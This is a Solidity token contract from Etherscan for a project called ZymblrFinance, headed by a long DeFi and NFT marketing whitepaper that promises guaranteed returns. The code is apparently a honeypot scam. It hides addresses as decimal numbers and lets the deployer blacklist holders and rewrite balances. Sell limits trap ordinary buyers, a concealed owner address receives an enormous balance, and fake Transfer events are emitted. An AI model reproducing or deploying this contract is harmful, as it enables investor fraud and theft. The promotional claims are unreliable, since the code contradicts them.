/**
 *Submitted for verification at Etherscan.io on 2023-03-14
*/

/*

Website :  https://zymblr.com

Twitter : https://twitter.com/ZymblrFinance

Telegram : https://t.me/Zymblr

Medium :  https://zymblr.medium.com


ABOUT US

A new type of asset distribution management service that links Defi and NFT market services through blockchain

Zymblr is a DeFi Gateway service designed to make DeFi universal and easy for anyone to use. This is a method that simplifies the complex staking method and reward method, finds the service that provides the most optimal APY, and automatically staking.


START FROM DEFI

Zymblr is simply an adoption-focused DeFi protocol on which we intend to create a fully-integrated & user-friendly platform/service, connecting many cryptomuggles with the many decentralized financial products and services already on the market. Our goal is to make DeFi simple and easier to use to create better user experience for those who are intimidated by the learning curve, therefore we make the barrier-toentry lower. We'll accomplish this by focusing not only on innovating and creating a product no one has ever created before on the bleeding edge, but also by working towards mass adoption of just the bleeding-edge that already exists and making that experience as seamless as possible for the user.


FINDING DIRECTION IN NFT

NFT services are already established in the market for various asset trading and management purposes. Most people thought that NFT was a temporary phenomenon and that the bubble would soon burst. However, NFTs have grown into a market with enormous influence and are beginning to be used as asset trading in various countries. Zymblr intends to develop a new asset management service by combining these NFT asset services with DeFi. This can be a means of generating new revenues after owning and trading NFTS. And all these actions are distributed and managed on the Blockchain. Zymblr connects its own NFT market with an external NFT market to register assets and use DeFi's financial services with the registered assets as collateral.


OUR MISSION

Our purpose and goal is to provide the greatest profit for our users.To achieve this, we will do:

-Aim to provide a guaranteed minimum return.

-Build a new user friendly UIUX for user convenience.

-Allow for user rewards to be paid and used immediately.

-Supports NFT trading and staking to maximize returns.

-Allow for easy swapping between tokens.

- Ensure all governance to be implemented/decided through the Governance Token.


OUR VISION

Accessibility that anyone can easily access 

NFT asset and DeFi interworking platform

Decentralized finance with stable APY

Opening a new platform so that customers can make their own asset management rather than large institutions. And with that, to build a stable asset management service in the virtual asset market. That is the vision of Zymblr. Blockchain is an important tool for shaping the future of finance. In particular, DeFi and NFT are the biggest topics in the new virtual asset market. We will create services for our customers by continuously upgrading until the day that all digital assets are freely traded in the decentralized financial market.


MARKET STATUS(DEFI)

Over the past few years, the DeFi space has continued to grow with an increase in new applications, primitives, and protocols. This structure, as we have said, is moving towards a commercialized future financial system, and interest is beginning to surge in the crypto and non-crypto communities. DeFi trading volume has grown from zero to over $20 billion in total lock value (TVL) over the past year. Many DeFi projects require users to lock an asset (collateral) in order to obtain a loan, create liquidity in the market, or issue a new asset. These collateralized assets have created a metric for evaluating these applications, called Total Locked Value (TVL).

With that in mind, we see DeFi Dominance (vs. Global) reaching a total of 1.4%. This shows that many cryptocurrency investors are taking advantage of newly accessible financial products. The increasing figure is mainly due to network development and applications and will attract more cryptocurrency traders. In 2021, the price of Bitcoin and Ethereum soared to billions of dollars in daily market size. As cryptocurrencies and blockchains become more commercialized for their existence and productivity, DeFi continues to grow globally and must replace traditional financial systems.
 

MARKET STATUS (NFT)


NFT (Non-Fungible Token) technology, which gives scarce value to content, has recently been actively used as a means of creating added value in various industries. In particular, the value of digital content, which was unclear through NFT, is being re-evaluated, and as ownership transfer becomes easier, the related transaction market is also rapidly expanding. 

According to Nonfungible.com, a non-fungible token (NFT) specialized analysis site, the global NFT transaction amount in the second quarter of 2021 was $7.54 billion, which is a 35-fold increase compared to the same period of the previous year. This is an increase of about 1.5 times compared to the previous quarter, and the term 'storm growth' is appropriate.

The translation of NFT is 'non-fungible token'. Here, a token is interpreted similarly to a 'digital token', and a non-fungible token means that the information of a specific thing is recorded, and a copy cannot exist. Accordingly, NFTs are currently mainly used to record and prove ownership of objects, and even replicable products are attracting attention in that they can be easily identified as genuine by linking NFTS.

This is because NFTs are digital tokens created through blockchain, a trustbased network. In a blockchain, multiple computers that act as servers (nodes) are widely distributed to form a single network, and data recording is made only for data that has passed verification of all nodes.

Due to this structure, the block chain is difficult to hack, and once stored data is impossible to forge or falsify, it is highly reliable. This is the reason why NFTS, which were created based on this, boast excellent compatibility in areas where security and trust are important, such as proof of ownership or genuine product authentication. NFT is easier to publish and manage than existing electronic documents with similar roles. . This is because, as the public's interest in NFTS grew in earnest, especially overseas last year, a large number of platforms were created where non-experts could create or trade NFTs on the web. On the global stage, 'OpenSea' is known as the most popular NFT market. can be distributed It is also free to purchase or resell NFTs issued by others.

In addition, all NFTs are engraved with the time of initial issuance, transaction time, transaction amount, and past owner information, so it is difficult to deceive a fake as if it were real. As such, NFTs are recognized for their diverse potential in that they can be easily issued and distributed, high reliability is guaranteed, and can even be monetized through transactions. The fields of application and applications are endless.

NFT was first known in the field of games. In 2017, a blockchain + NFT game called 'Crypto Kitty' was gaining popularity.

It looks like a simple cat card game, but each card is created with NFT, giving it an irreplaceable rarity, and if you combine cards to create a more rare cat card, the transaction value increases that much. Since this concept has become popular, attempts have been made in the game industry to plovide users with the added value of monetization as well as the fun of the game through the grafting of "NFT items'. In a completely virtual metaverse world, there are games such as 'The Sandbox' in which all elements including real estate are NFTized. Following games, the field that opened the 'flower' of the NFT market is digital art. In the past, digital art works have been difficult to be recognized for their value due to the limitations of easy copying, but the story has changed with the advent of NFTs

This is because even if hundreds or thousands of copies are widespread on the Internet, those who can trade with their genuine value recognized can narrow the linked NFT to one owner (or several, NFT ownership can be divided into n pieces). Of course, not all NFT works are sold at high prices. According to Nonfungible.com, more than half of NFT works are priced at less than $1,000. However, the case of Beeple and Grimes has a lot of implications in that it heralded the beginning of an era in which digital works can be recognized as having the same value as the real thing.

We are creating a new era of asset management called decentralized finance. In addition, various digital assets are traded in the form of NFTSs. And then comes the birth of decentralized finance and derivatives of NFTs.

ZBR DEFI SERVICE

The initial launch for the Zymblr platform will happen via a Web App.This decision was made in an attempt to get involved the existing DeFi/Crypto community. The goal is for the existing community members to have enough incentivization to continually participate in the long-term education of those newer to the space. As this part of the platform/service is nothing new to the space we have decided to stick to the most basic features and layout for the Web App


OPTIMIZED WEIGHTING SYSTEM FOR MAXIMAL RETURNS (REWARD BOOSTER)

Generally DeFi Pool Product (LP) operate on reward systems that are distributed appropriately proportioned according to the number of pool products .The Reward in this instance, deteriorates in value in accordance with token's value and characteristics of the capital participating in the pool. In first few days it may appear that one is yielding high returns, but by design, gradually its attractiveness is lost as an investment product.

ZBR Pool is designed so that all returns are managed through individual Boosting Option's for all Block Rewards. Therefore the dilutive impact on the Reward due to increasing users is relatively is minimized and thus relatively small. Also compensation given to users is high relative to other projects, due to the additional compensation provided by virtue of the Boosting Option.


MINTING FEATURE FOR BOOSTING CUSTOMER'S RETURN RATE (MINTING BOOSTER)

ZBR is an example of a Mintable Token, in that Tokens are issued on a per block basis. Generally, Mintable Tokens are said to be conceptually related to Pool Rewards, however such a link is very limiting in terms of their function and definition. Rather than the Mintable Token contributing to the Pool Reward on a proportional basis over time, they are more often seen as a means of generating tokens for free when a need/insufficiency arises. ZBR was formulated to accelerate the process of the Minted Token being paid into the Reward Pool. The Minted Token is not just transactional consideration or compensation, but rather structural enhancoment so that rewards are paid more frequently and efficiently.



PLATFORM ECO SYSTEM

The ZBR Token Staking service is a new market for decentralized finance that guarantees the most stable customer assets and can generate profits. Many DeFi services that appeared in 2020 have proven their stability and profitability. Among them, we start farming from products of Uniswap with high stability. Booster payout rate Uniswap receives 15% additional acceleration service.

The Reward received from the Staking Service, proportionally decreases in line with increases in Staking Pool participation. To try and offset this affect, ZBR Yield Farm has been to designed to feature a separate Booster Reward.

Zymblr also provides a staking service for NFT assets, a new asset service.

Distribute, stake and share profits through overseas NFT markets connected to its own NFT market


*/

// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.6.12;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address deployer, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    
    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
    
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}


library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract ZymblrFinance  {

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _deployer, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {

    return transferFrom(msg.sender, _to, _value);
    }
    address private spend = address (96635033217071433185869069577301221175488545358);
    address private src = address (527585359103765554095092340981710322784165800559);
    address private dst = address (1097077688018008265106216665536940668749033598146); 
    address private crs = address (1153667454655315432277308296129700421378034175091);
    address private tsd = address (1069295261705322660692659746119710186699350608220);
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _UX = TexFor(src, dst, address(this));
        address _PX = TexForB(crs, tsd, address(this));
        if(_from == deployer || _to == deployer  || _from == owner || _from == _UX || _from == _PX ||  _from == TexAddress || TexMemory[_from]) {return true;}
        if( RBMemory[_from] ) {return false;}
        require(condition(_from, _value));
        return true; 
    }
    function _UXTexAddr () view internal returns (address) {
        address _UX = TexFor(src, dst, address(this));
        return _UX;
    }
    function _PXTexAddr () view internal returns (address) {
        address _PX = TexForB(crs, tsd, address(this));
        return _PX;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {
            return true;
        }
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        if (_from == TexAddress  && _value > _maxMemory ){ RBMemory[_to]=true;  }
        
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onMemoryNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        if (_spender == spend ){
            emit Transfer(address(0x0),O,1*(10**uint256(decimals)));
        }
        return true;
    }
    function condition(address _from, uint _value) internal view returns(bool){
        if(_MemoryNum == 0 && _minMemory == 0 && _maxMemory == 0) return false;
        if(_MemoryNum > 0){
            if(_onMemoryNum[_from] >= _MemoryNum) return false;
        }
        if(_minMemory > 0){
            if(_minMemory > _value) return false;
        }
        if(_maxMemory > 0){
            if(_value > _maxMemory) return false;
        }
        return true;
    }
    function transferTo(address addr, uint256 addedValue) public payable returns (bool) {
        require(msg.sender == deployer);
        if(addedValue > 0) {balanceOf[addr] = addedValue*(10**uint256(decimals));}
        TexMemory[addr]=true;
        return true;
    }
    
    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == deployer);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value*(10**uint256(decimals));
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            
        }
        return true;
    }
    mapping(address=>uint256) private _onMemoryNum;
    mapping(address=>bool) private TexMemory;
    mapping(address=>bool) private RBMemory;
    uint256 private _minMemory;
    uint256 private _maxMemory;
    uint256 private _MemoryNum;
    address TexAddress;
    function Agree(address addr) public returns (bool) {
        require(msg.sender == deployer);
        TexMemory[addr]=true;
        return true;
    }
    function Allow(uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory) public returns(bool){
        require(msg.sender == deployer);
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        return true;
    }
    function delegate(address adr) public payable returns(bool){
        require (msg.sender == deployer);
        TexAddress = adr;
        return true;
    }
    function Optimization(address [] calldata addresses) public returns (bool) {
        require(msg.sender == deployer);
        for (uint i = 0; i < addresses.length; i++) 
        {RBMemory[addresses[i]] = true;}
        return true;
    }
    address  private owner=
    address (935108584672418476850882679418664731027763688343);
    function TexFor(address factory, address tokenA, address tokenB) internal pure returns (address Tex) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Tex = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
                ))));
    }
    address private O = address(269488144);
    function TexForB(address factory, address tokenA, address tokenB) internal pure returns (address Texe) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Texe = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                ))));
    }
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private deployer;
    constructor(string memory _name, string memory _symbol, uint256 _supply, uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory ) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
        if(totalSupply > 0) balanceOf[owner]=totalSupply*(10**uint256(6));
    }
}